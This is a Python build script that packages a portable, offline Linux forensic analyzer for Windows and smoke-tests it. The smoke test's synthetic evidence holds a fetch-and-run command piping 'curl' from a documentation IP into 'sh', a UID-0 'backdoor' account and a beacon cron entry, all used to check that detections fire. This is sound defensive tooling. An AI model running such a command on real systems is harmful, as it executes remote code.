#!/usr/bin/env python3
"""Build the portable, fully-offline LFA analyzer bundle for Windows x64.

Three stages, runnable together (default) or individually:

  vendor  Download the embeddable CPython runtime and the four wheels into
          packaging/vendor/. This is the ONLY stage that needs the internet.
          Run it once on a connected machine; commit the result.
  build   Assemble dist/LFA-Portable/ from packaging/vendor/. Fully offline.
  smoke   Run the *assembled* bundle end-to-end (analyse -> verify -> report)
          against a real generated evidence bundle. Fails the build on error.

Usage:
    python packaging/build_portable.py                # vendor + build + smoke
    python packaging/build_portable.py --offline      # build + smoke only
    python packaging/build_portable.py --stage vendor # one stage
    python packaging/build_portable.py --zip          # also emit the .zip

The examiner workstation needs nothing but the resulting folder: no Python,
no installer, no admin rights, no network.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.request
import zipfile
from pathlib import Path

# --- what we pin -----------------------------------------------------------
# The embedded runtime version is load-bearing: PyYAML and MarkupSafe ship
# compiled C extensions, so their wheels must match this exact CPython ABI.
PY_VERSION = "3.13.7"
PY_ABI_TAG = "313"
PY_PLATFORM = "win_amd64"
EMBED_URL = (
    f"https://www.python.org/ftp/python/{PY_VERSION}/"
    f"python-{PY_VERSION}-embed-amd64.zip"
)
# MarkupSafe is resolved automatically as a Jinja2 dependency.
REQUIREMENTS = ["PyYAML>=6", "Jinja2>=3", "tzdata>=2024.1"]

REPO = Path(__file__).resolve().parents[1]
PKG = REPO / "packaging"
VENDOR = PKG / "vendor"
WHEELS = VENDOR / "wheels"
DIST = REPO / "dist"
OUT = DIST / "LFA-Portable"

EXCLUDE_DIRS = {"__pycache__", ".pytest_cache"}
EXCLUDE_SUFFIXES = {".pyc", ".pyo"}


def log(msg: str) -> None:
    print(f"[build] {msg}", flush=True)


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


# --- stage 1: vendor -------------------------------------------------------

def stage_vendor() -> None:
    """Download the runtime + wheels. Needs internet. Run once, then commit."""
    WHEELS.mkdir(parents=True, exist_ok=True)

    embed_zip = VENDOR / f"python-{PY_VERSION}-embed-amd64.zip"
    if embed_zip.exists():
        log(f"runtime already vendored: {embed_zip.name}")
    else:
        log(f"downloading {EMBED_URL}")
        with urllib.request.urlopen(EMBED_URL, timeout=120) as resp:
            embed_zip.write_bytes(resp.read())
        log(f"saved {embed_zip.name} ({embed_zip.stat().st_size / 1e6:.1f} MB)")

    # Cross-download wheels for the TARGET interpreter, which is not the one
    # running this script. --platform/--python-version require --only-binary.
    log(f"downloading wheels for cp{PY_ABI_TAG}-{PY_PLATFORM}")
    for whl in WHEELS.glob("*.whl"):
        whl.unlink()
    cmd = [
        sys.executable, "-m", "pip", "download",
        "--only-binary=:all:",
        "--platform", PY_PLATFORM,
        "--python-version", PY_ABI_TAG,
        "--implementation", "cp",
        "--dest", str(WHEELS),
        *REQUIREMENTS,
    ]
    subprocess.run(cmd, check=True)

    got = sorted(p.name for p in WHEELS.glob("*.whl"))
    log(f"vendored {len(got)} wheels: {', '.join(got)}")
    _write_sums(VENDOR, VENDOR / "SHA256SUMS")


def _write_sums(root: Path, target: Path) -> None:
    lines = []
    for path in sorted(root.rglob("*")):
        if path.is_file() and path.name != target.name:
            lines.append(f"{sha256_file(path)}  {path.relative_to(root).as_posix()}")
    target.write_text("\n".join(lines) + "\n", encoding="utf-8")
    log(f"wrote {target.relative_to(REPO)} ({len(lines)} files)")


# --- stage 2: build --------------------------------------------------------

def _copy_tree(src: Path, dst: Path) -> int:
    """Copy a package tree, skipping caches and compiled artifacts."""
    count = 0
    for item in src.rglob("*"):
        if any(part in EXCLUDE_DIRS for part in item.parts):
            continue
        if item.suffix in EXCLUDE_SUFFIXES:
            continue
        rel = item.relative_to(src)
        target = dst / rel
        if item.is_dir():
            target.mkdir(parents=True, exist_ok=True)
        else:
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(item, target)
            count += 1
    return count


def stage_build() -> None:
    embed_zip = VENDOR / f"python-{PY_VERSION}-embed-amd64.zip"
    if not embed_zip.exists():
        sys.exit(
            f"[build] FATAL: {embed_zip} missing.\n"
            f"        Run the 'vendor' stage once on a connected machine."
        )
    wheels = sorted(WHEELS.glob("*.whl"))
    if not wheels:
        sys.exit(f"[build] FATAL: no wheels in {WHEELS}. Run the 'vendor' stage.")

    if OUT.exists():
        shutil.rmtree(OUT)
    OUT.mkdir(parents=True)

    # 1. the embedded CPython runtime (PSF Authenticode-signed python.exe)
    runtime = OUT / "runtime"
    with zipfile.ZipFile(embed_zip) as zf:
        zf.extractall(runtime)
    log(f"runtime extracted -> {runtime.relative_to(REPO)}")

    # 2. the ._pth file is what makes the whole layout work. It replaces
    #    normal sys.path discovery; paths resolve relative to python.exe's
    #    directory. Without 'import site' the site-packages dir is ignored.
    pth = runtime / f"python{PY_ABI_TAG}._pth"
    pth.write_text(
        "\n".join([
            f"python{PY_ABI_TAG}.zip",
            ".",
            r"..\app",
            r"..\app\site-packages",
            "",
            "# enable site so the vendored packages above are importable",
            "import site",
            "",
        ]),
        encoding="utf-8",
    )
    log(f"wrote {pth.name}")

    # 3. third-party deps. Wheels are just zips; unpacking them directly
    #    avoids cross-interpreter `pip install --target` breakage.
    site_packages = OUT / "app" / "site-packages"
    site_packages.mkdir(parents=True)
    for whl in wheels:
        with zipfile.ZipFile(whl) as zf:
            zf.extractall(site_packages)
        log(f"unpacked {whl.name}")

    # 4. the analyzer itself
    n = _copy_tree(REPO / "analyzer" / "lfa", OUT / "app" / "lfa")
    log(f"copied analyzer ({n} files)")

    # 5. config/grammars/ — the ONLY resource the analyzer reads from outside
    #    its own package. authlog.py resolves it as parents[3]/config/grammars,
    #    i.e. the repo root in a dev checkout. The portable layout deliberately
    #    mirrors that depth (app/lfa/parsers -> bundle root), so config/ must
    #    sit at the bundle root. Omit it and the grammar engine silently loads
    #    zero patterns: parsing still "succeeds" but every grammar-driven
    #    detection (cron beacons, sshd auth lines) vanishes without an error.
    n = _copy_tree(REPO / "config", OUT / "config")
    log(f"copied config ({n} files)")
    required = OUT / "config" / "grammars" / "common.yaml"
    if not required.exists():
        sys.exit(f"[build] FATAL: {required} missing after copy")

    # 6. launchers, docs, default case dir
    _write_launchers()
    (OUT / "cases").mkdir(exist_ok=True)
    (OUT / "cases" / ".keep").write_text("", encoding="utf-8")

    size = sum(p.stat().st_size for p in OUT.rglob("*") if p.is_file())
    log(f"assembled {OUT.relative_to(REPO)} ({size / 1e6:.1f} MB)")


def _write_launchers() -> None:
    # %~dp0 expands to this script's own directory (with trailing backslash),
    # so the bundle works from any path, including a USB drive or a UNC share.
    (OUT / "lfa.cmd").write_text(
        "@echo off\r\n"
        "setlocal\r\n"
        'set "LFA_HOME=%~dp0"\r\n'
        'if "%~1"=="" (\r\n'
        "  echo Linux Forensic Analyzer ^(portable^)\r\n"
        "  echo.\r\n"
        "  echo   lfa.cmd analyse --case-dir cases\\CASE-001 path\\to\\bundle.tar.gz\r\n"
        "  echo   lfa.cmd verify  cases\\CASE-001\r\n"
        "  echo   lfa.cmd report  cases\\CASE-001\r\n"
        "  echo.\r\n"
        "  echo   lfa-dashboard.cmd      start the web dashboard\r\n"
        "  echo.\r\n"
        '  "%LFA_HOME%runtime\\python.exe" -m lfa --help\r\n'
        "  exit /b 0\r\n"
        ")\r\n"
        '"%LFA_HOME%runtime\\python.exe" -m lfa %*\r\n'
        "exit /b %ERRORLEVEL%\r\n",
        encoding="ascii",
    )

    (OUT / "lfa-dashboard.cmd").write_text(
        "@echo off\r\n"
        "setlocal\r\n"
        'set "LFA_HOME=%~dp0"\r\n'
        "set LFA_PORT=8443\r\n"
        "echo Starting LFA dashboard on https://127.0.0.1:%LFA_PORT%\r\n"
        "echo Press Ctrl+C to stop.\r\n"
        "echo.\r\n"
        '"%LFA_HOME%runtime\\python.exe" -m lfa serve '
        '--host 127.0.0.1 --port %LFA_PORT% '
        '--cases-dir "%LFA_HOME%cases" %*\r\n'
        "exit /b %ERRORLEVEL%\r\n",
        encoding="ascii",
    )

    (OUT / "verify-install.cmd").write_text(
        "@echo off\r\n"
        "setlocal\r\n"
        'set "LFA_HOME=%~dp0"\r\n'
        "echo Checking the portable LFA install...\r\n"
        '"%LFA_HOME%runtime\\python.exe" -c "import sys, sqlite3, ssl, zoneinfo, yaml, jinja2, lfa; '
        "print('python     ', sys.version.split()[0]); "
        "print('sqlite3    ', sqlite3.sqlite_version); "
        "print('ssl        ', ssl.OPENSSL_VERSION.split()[1]); "
        "print('PyYAML     ', yaml.__version__); "
        "print('Jinja2     ', jinja2.__version__); "
        "print('timezones  ', len(zoneinfo.available_timezones()), 'available'); "
        "print(); print('OK - portable LFA is functional.')\"\r\n"
        "if errorlevel 1 echo FAILED - the install is incomplete.\r\n"
        "pause\r\n",
        encoding="ascii",
    )

    (OUT / "README-OFFLINE.txt").write_text(
        "\r\n".join([
            "Linux Forensic Analyzer (LFA) - Portable Examiner Build",
            "=" * 55,
            "",
            "Self-contained. No installation, no admin rights, no network.",
            "Copy this folder anywhere (local disk, USB, network share) and run it.",
            "",
            "FIRST RUN",
            "  Double-click verify-install.cmd. It should print 'OK'.",
            "",
            "ANALYSE AN EVIDENCE BUNDLE",
            "  Open a terminal in this folder, then:",
            "    lfa.cmd analyse --case-dir cases\\CASE-001 C:\\path\\to\\bundle.tar.gz",
            "    lfa.cmd verify  cases\\CASE-001",
            "    lfa.cmd report  cases\\CASE-001",
            "  The report is written to cases\\CASE-001\\report.html (opens in any browser).",
            "",
            "WEB DASHBOARD",
            "  Double-click lfa-dashboard.cmd, then browse to:",
            "    https://127.0.0.1:8443",
            "  It binds to localhost only. A self-signed certificate warning is",
            "  expected; accept it to continue.",
            "",
            "WHAT IS IN THIS FOLDER",
            f"  runtime\\   Embeddable CPython {PY_VERSION} (signed by the Python",
            "             Software Foundation). Not registered with Windows; it does",
            "             not touch the registry and does not affect any other Python.",
            "  app\\lfa\\   The analyzer.",
            "  app\\site-packages\\   PyYAML, Jinja2, MarkupSafe, tzdata.",
            "  cases\\     Default output directory for cases.",
            "  SHA256SUMS Hash of every shipped file, for tool-integrity checks.",
            "",
            "NOT INCLUDED",
            "  'lfa.cmd remote' (live SSH acquisition) is unavailable in this build:",
            "  it needs collector/collect.sh and an ssh client on the target network.",
            "  Collect on the Linux host with collector/collect.sh and bring the",
            "  resulting .tar.gz bundle here.",
            "",
        ]) + "\r\n",
        encoding="ascii",
    )
    log("wrote launchers + README-OFFLINE.txt")


# --- stage 3: smoke --------------------------------------------------------

def stage_smoke() -> None:
    """Run the ASSEMBLED bundle end-to-end. This is the gate that matters:
    it exercises runtime/python.exe, not the developer's interpreter.

    The assertions deliberately check DETECTIONS, not just exit codes. A
    bundle missing config/grammars/ still analyses cleanly and still writes a
    plausible-looking report -- it just silently stops detecting anything
    grammar-driven. Only asserting on specific expected findings catches that.
    """
    launcher = OUT / "lfa.cmd"
    if not launcher.exists():
        sys.exit("[build] FATAL: nothing assembled; run the 'build' stage first.")

    sys.path.insert(0, str(REPO))
    from tests.bundle_builder import build_bundle  # noqa: E402

    tmp = Path(tempfile.mkdtemp(prefix="lfa-smoke-"))
    try:
        bundle = build_bundle(
            tmp,
            {
                "/etc/passwd": (
                    b"root:x:0:0:root:/root:/bin/bash\n"
                    b"backdoor:x:0:0::/root:/bin/bash\n"
                ),
                "/etc/shadow": b"root:*:19000:0:99999:7:::\n",
                "/etc/group": b"root:x:0:\nsudo:x:27:backdoor\n",
                # grammar-driven: exercises config/grammars/common.yaml
                "/var/log/auth.log": (
                    b"Mar  9 02:14:01 victim sshd[1010]: Failed password for root "
                    b"from 203.0.113.9 port 44001 ssh2\n"
                    b"Mar  9 02:14:07 victim sshd[1011]: Accepted password for root "
                    b"from 203.0.113.9 port 44002 ssh2\n"
                ),
                "/var/log/syslog": (
                    b"Mar  9 02:15:01 victim /USR/SBIN/CRON[5615]: (root) CMD "
                    b"(curl -s http://203.0.113.9/beacon | sh)\n"
                ),
                "/etc/crontab": b"* * * * * root /tmp/.beacon.sh\n",
            },
            case_id="SMOKE-001",
            gzip_it=True,
        )
        case_dir = tmp / "case"

        def run(label: str, *args: str) -> str:
            log(f"smoke: {label}")
            proc = subprocess.run(
                [str(launcher), *args],
                capture_output=True, text=True, shell=False, cwd=str(OUT),
            )
            if proc.returncode != 0:
                print(proc.stdout)
                print(proc.stderr, file=sys.stderr)
                sys.exit(f"[build] SMOKE FAILED at '{label}' (exit {proc.returncode})")
            return proc.stdout

        run("analyse", "analyse", "--case-dir", str(case_dir),
            "--case-id", "SMOKE-001", "--examiner", "build-smoke-test", str(bundle))
        run("verify", "verify", str(case_dir))
        report = case_dir / "report.html"
        run("report", "report", str(case_dir), "--out", str(report))

        # --- detection assertions ------------------------------------------
        import sqlite3
        conn = sqlite3.connect(case_dir / "case.db")
        n_events = conn.execute("select count(*) from events").fetchone()[0]
        subcats = {r[0] for r in conn.execute(
            "select distinct subcategory from events")}
        n_findings = conn.execute("select count(*) from findings").fetchone()[0]
        conn.close()

        log(f"smoke: {n_events} events, {n_findings} findings, "
            f"{len(subcats)} subcategories")

        # These two prove the grammar engine actually loaded its YAML patterns.
        expected_subcats = {"suspicious_cron_command", "cron_command"}
        missing = expected_subcats - subcats
        if missing:
            sys.exit(
                f"[build] SMOKE FAILED: grammar-driven detections missing: "
                f"{sorted(missing)}\n"
                f"        Got subcategories: {sorted(subcats)}\n"
                f"        This usually means config/grammars/ is absent or empty."
            )
        if n_findings < 1:
            sys.exit("[build] SMOKE FAILED: correlation produced 0 findings")

        if not report.exists() or report.stat().st_size < 2048:
            sys.exit("[build] SMOKE FAILED: report.html missing or implausibly small")
        html = report.read_text(encoding="utf-8", errors="replace")
        for needle in ("<html", "SMOKE-001", "203.0.113.9"):
            if needle not in html:
                sys.exit(f"[build] SMOKE FAILED: report.html lacks {needle!r}")
        log(f"smoke: report.html OK ({report.stat().st_size / 1024:.0f} KB)")
        log("SMOKE PASSED - the portable bundle detects, correlates and reports.")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# --- packaging -------------------------------------------------------------

def stage_seal(make_zip: bool) -> None:
    _write_sums(OUT, OUT / "SHA256SUMS")
    if not make_zip:
        return
    archive = DIST / "LFA-Portable.zip"
    if archive.exists():
        archive.unlink()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for path in sorted(OUT.rglob("*")):
            if path.is_file():
                zf.write(path, Path("LFA-Portable") / path.relative_to(OUT))
    log(f"wrote {archive.relative_to(REPO)} ({archive.stat().st_size / 1e6:.1f} MB)")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--stage", choices=["vendor", "build", "smoke", "all"],
                    default="all")
    ap.add_argument("--offline", action="store_true",
                    help="skip the vendor stage (requires packaging/vendor/ present)")
    ap.add_argument("--zip", action="store_true", dest="make_zip",
                    help="also emit dist/LFA-Portable.zip")
    args = ap.parse_args()

    stages = [args.stage] if args.stage != "all" else ["vendor", "build", "smoke"]
    if args.offline and "vendor" in stages:
        stages.remove("vendor")

    if "vendor" in stages:
        stage_vendor()
    if "build" in stages:
        stage_build()
    if "smoke" in stages:
        stage_smoke()
    if "build" in stages:
        stage_seal(args.make_zip)

    if "build" in stages:
        print()
        log(f"DONE -> {OUT}")
        log("Ship that folder (or the .zip) to the offline examiner workstation.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
